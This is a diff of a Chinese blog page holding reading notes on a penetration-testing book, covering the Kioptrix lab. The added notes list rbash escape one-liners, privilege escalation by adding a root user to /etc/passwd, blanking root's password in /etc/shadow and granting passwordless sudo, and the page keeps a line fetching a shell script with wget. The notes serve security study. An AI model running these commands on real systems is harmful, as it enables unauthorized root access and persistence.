@@ -28,10 +28,14 @@
 <meta property="og:site_name" content="安小琪&#39;s blog">
 <meta property="og:description" content="《脑洞大开：渗透测试另类实战攻略》读书笔记">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.npfs06.top/20230922161952.png">
+<meta property="og:image" content="https://img.npfs06.top/20230922155015.png">
+<meta property="og:image" content="https://img.npfs06.top/20230922160336.png">
 <meta property="article:published_time" content="2023-09-22T01:41:39.000Z">
 <meta property="article:modified_time" content="2023-09-22T01:41:39.000Z">
 <meta property="article:author" content="安小琪">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.npfs06.top/20230922161952.png">
 
 <link rel="canonical" href="https://npfs06.top/2023/09/22/%E3%80%8A%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%8F%A6%E7%B1%BB%E5%AE%9E%E6%88%98%E6%94%BB%E7%95%A5%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">
 
@@ -270,16 +274,31 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">10</span>.xxx.xxx.xxx/shell.sh</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="第二章：新手村：从Kioptrix开始"><a href="#第二章：新手村：从Kioptrix开始" class="headerlink" title="第二章：新手村：从Kioptrix开始"></a>第二章：新手村：从Kioptrix开始</h1><p>1、<strong>对于开放开80和443端口的IP，要分别访问80和443端口</strong></p>
+<h1 id="第二章：新手村：从Kioptrix开始"><a href="#第二章：新手村：从Kioptrix开始" class="headerlink" title="第二章：新手村：从Kioptrix开始"></a>第二章：新手村：从Kioptrix开始</h1><h2 id="Point-1"><a href="#Point-1" class="headerlink" title="Point 1"></a>Point 1</h2><p>对于开放开80和443端口的IP，要分别访问80和443端口</p>
 <figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    小贴士:相信有不少人会误以为https服务所提供的站点内容与当前主机http服务所提供的</span><br><span class="line">相同。实际上，在很多情况下，它们所提供的站点内容并不一样，因此在进行渗透测试时应针对</span><br><span class="line">它们分别进行测试。类似地， 一个<span class="built_in">IP</span>下可以运行多个站点，通过<span class="built_in">IP</span>访问和通过域名访问获得的结</span><br><span class="line">果也可能不尽相同，所以应分别留意。</span><br></pre></td></tr></table></figure>
 
 
-<p>2、<strong>过时的中间件、服务版本，可能会存在漏洞，可在Exploit Database进行检索</strong></p>
-<p>3、<strong>getshell之后可通过linux提权辅助工具LinEnum进行提权</strong></p>
+<h2 id="Point-2"><a href="#Point-2" class="headerlink" title="Point 2"></a>Point 2</h2><p>过时的中间件、服务版本，可能会存在漏洞，可在Exploit Database进行检索</p>
+<h2 id="Point-3"><a href="#Point-3" class="headerlink" title="Point 3"></a>Point 3</h2><p>getshell之后可通过linux提权辅助工具LinEnum进行提权</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinEnum 是一个 Linux 主机本地信息自动提取的 shell 脚本，它有超过 <span class="number">65</span> 项安全检查功能，比如潜在的 SUID<span class="regexp">/GUID 文件、Sudo/</span>rhost 错误配置等。</span><br></pre></td></tr></table></figure>
-<p>4、提权需要在目标主机本地系统中选择一个我们拥有写权限的目录，<strong>Linux 下常用的相关目录</strong><br><strong>有/tmp/目录以及/dev/shm/目录等</strong></p>
-<p>5、rbash</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">小贴士: rbash是一种功能受限的<span class="keyword">bash </span><span class="keyword">shell,即它可以执行的命令被人为限制了，只有特</span></span><br><span class="line"><span class="keyword">定几种，也就是说，rbash是一 </span>种白名单限制<span class="keyword">shell,使用rbash </span>登录的用户只允许使用管理员预</span><br><span class="line">先设定好的命令，</span><br><span class="line">可见rbash的权限很低。如果rbash中限定的命令种类设置存在疏忽，就可能</span><br><span class="line">导致恶意攻击者可以利用某些被错误允许执行的命令运行出一个不受限的<span class="keyword">bash </span><span class="keyword">shell,该操作被</span></span><br><span class="line"><span class="keyword">成为rbash逃逸，我们将在下一节实践相关测试。</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Point-5"><a href="#Point-5" class="headerlink" title="Point 5"></a>Point 5</h2><p>提权需要在目标主机本地系统中选择一个我们拥有写权限的目录，<strong>Linux 下常用的相关目录</strong><br><strong>有/tmp/目录以及/dev/shm/目录等</strong></p>
+<h2 id="Point-6"><a href="#Point-6" class="headerlink" title="Point 6"></a>Point 6</h2><p>rbash</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">小贴士: rbash是一种功能受限的<span class="keyword">bash </span><span class="keyword">shell,即它可以执行的命令被人为限制了，只有特</span></span><br><span class="line"><span class="keyword">定几种，也就是说，rbash是一 </span>种白名单限制<span class="keyword">shell,使用rbash </span>登录的用户只允许使用管理员预</span><br><span class="line">先设定好的命令，可见rbash的权限很低。如果rbash中限定的命令种类设置存在疏忽，就可能</span><br><span class="line">导致恶意攻击者可以利用某些被错误允许执行的命令运行出一个不受限的<span class="keyword">bash </span><span class="keyword">shell,该操作被</span></span><br><span class="line"><span class="keyword">成为rbash逃逸</span></span><br></pre></td></tr></table></figure>
+<p>在rbash中输入“?” ，会获得当前shell允许执行的所有命令列表</p>
+<p><img src="https://img.npfs06.top/20230922161952.png"></p>
+<p>在rbash中，如果遇到了如下常见的命令被允许执行，就可以直接凭借对应的构造命令成功地实现rbash逃逸。换言之，如果想设置一个相对安全的rbash环境，以下命令不应该轻易被允许使用。<br>❑ 针对<code>ftp</code>、<code>more</code>、<code>less</code>、<code>man</code>、<code>vi</code>、<code>vim</code>，可在输入点输入<code>！/bin/sh</code>或<code>！/bin/bash</code>命令实现逃逸。<br>❑ <code>awk</code>可以使用<code>awk &#39;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code>或<code>awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>。<br>❑ <code>find</code>命令可以通过输入<code>find/-name SomeName-exec/bin/sh\；</code>和<code>find/-name SomeName-exec/bin/bash\；</code>实现逃逸。<br>❑ Python可以使用<code>python-c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;</code>命令实现逃逸。<br>❑ php可以使用<code>php-a then exec(&quot;sh-i&quot;)；</code>命令实现逃逸。<br>❑ Perl可以使用<code>perl-e &#39;exec&quot;/bin/sh&quot;;&#39;</code>命令实现逃逸。<br>❑ lua可以使用<code>os.execute（&#39;/bin/sh&#39;）</code>命令实现逃逸。<br>❑ ruby可以使用<code>exec&quot;/bin/sh&quot;</code>命令实现逃逸。</p>
+<p>这里只罗列了常见的部分，若想获得更多信息，建议进一步学习如下资料。<br>《Linux Restricted Shell Bypass》：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf%E3%80%82">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf。</a></p>
+<h2 id="Point-7"><a href="#Point-7" class="headerlink" title="Point 7"></a>Point 7</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小贴士: sudo是Linux系统下的管理指令，普通用户可以通过sudo命令以root权限执行管理员设定的几</span><br><span class="line">个或全部程序。设定不同，每个用户被允许使用sudo执行的命令种类和数量也不同。用户可以通过sudo -l命令查看当前用户被允许使用的程序列表。此外，有些用户在使用sudo -l命令的时候也需要提供当前用户的密码，这是因为管理员对用户的设置不同。如果需要密码，那么对于使用反弹<span class="keyword">shell</span><span class="bash">获得的用户身份而言，可能就无法直接查看和使用sudo命令了。</span></span><br></pre></td></tr></table></figure>
+<h2 id="Point-8"><a href="#Point-8" class="headerlink" title="Point 8"></a>Point 8</h2><p>拥有修改敏感文件的权限时（比如sudo ht），我们可以直接在<code>/etc/passwd</code>文件中新增用户，并且把密码直接写在/etc/passwd文件里。</p>
+<p>例如：<br><img src="https://img.npfs06.top/20230922155015.png"></p>
+<p>上述内容将创建一个用户名为rootwe,密码为toor的root用户。文中密码toor的密文sXuCKi7k3Xh/s是通过如下命令获得的:</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">openssl passwd -crypt toor</span></span><br></pre></td></tr></table></figure>
+<p>也可以编辑<code>/etc/shadow</code>文件，将root账号的密码清空，保存退出后，然后执行su root命令即可无须密码切换到root用户</p>
+<p><img src="https://img.npfs06.top/20230922160336.png"></p>
+<p>也可以编辑<code>/etc/sudoers</code>文件，该文件包含了每个用户可以在不输入密码的情况下使用sudo命令的范围，即执行sudo -l命令时获得的输出结果。可以直接修改该文件给当前的低权限用户添加无须使用密码执行sudo /bash命令的权限。</p>
+<h2 id="Point-9"><a href="#Point-9" class="headerlink" title="Point 9"></a>Point 9</h2><p>跑sqlmap的时候可以设置下<code>--level</code>或者<code>--risk</code></p>
 
     </div>
 
@@ -378,7 +397,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%AC%A2%E8%BF%8E%EF%BC%8C%E5%B9%B4%E8%BD%BB%E7%9A%84%E5%8B%87%E5%A3%AB%EF%BC%9A%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">第一章：欢迎，年轻的勇士：准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.</span> <span class="nav-text">nmap常用命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E5%85%B8"><span class="nav-number">1.2.</span> <span class="nav-text">字典</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%93%8D%E4%BD%9C"><span class="nav-number">1.3.</span> <span class="nav-text">文件传输操作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%96%B0%E6%89%8B%E6%9D%91%EF%BC%9A%E4%BB%8EKioptrix%E5%BC%80%E5%A7%8B"><span class="nav-number">2.</span> <span class="nav-text">第二章：新手村：从Kioptrix开始</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%AC%A2%E8%BF%8E%EF%BC%8C%E5%B9%B4%E8%BD%BB%E7%9A%84%E5%8B%87%E5%A3%AB%EF%BC%9A%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">第一章：欢迎，年轻的勇士：准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.</span> <span class="nav-text">nmap常用命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E5%85%B8"><span class="nav-number">1.2.</span> <span class="nav-text">字典</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%93%8D%E4%BD%9C"><span class="nav-number">1.3.</span> <span class="nav-text">文件传输操作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%96%B0%E6%89%8B%E6%9D%91%EF%BC%9A%E4%BB%8EKioptrix%E5%BC%80%E5%A7%8B"><span class="nav-number">2.</span> <span class="nav-text">第二章：新手村：从Kioptrix开始</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-1"><span class="nav-number">2.1.</span> <span class="nav-text">Point 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-2"><span class="nav-number">2.2.</span> <span class="nav-text">Point 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-3"><span class="nav-number">2.3.</span> <span class="nav-text">Point 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-5"><span class="nav-number">2.4.</span> <span class="nav-text">Point 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-6"><span class="nav-number">2.5.</span> <span class="nav-text">Point 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-7"><span class="nav-number">2.6.</span> <span class="nav-text">Point 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-8"><span class="nav-number">2.7.</span> <span class="nav-text">Point 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Point-9"><span class="nav-number">2.8.</span> <span class="nav-text">Point 9</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
